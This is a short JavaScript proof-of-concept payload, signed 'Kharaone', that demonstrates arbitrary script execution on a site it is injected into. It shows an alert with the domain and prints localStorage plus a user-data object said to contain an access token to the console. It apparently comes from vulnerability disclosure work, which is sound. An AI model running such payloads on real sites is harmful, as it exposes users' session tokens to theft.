
console.log(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> ");
console.log(">>>>>> Kharaone, PoC for arbitrary JS execution on " + document.domain);
console.log(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
alert(document.domain);
console.log("Local Storage:\n" + (localStorage));
console.log("Sensitive User Data (see gs_access_token):\n" + create_dynamic_user_info);
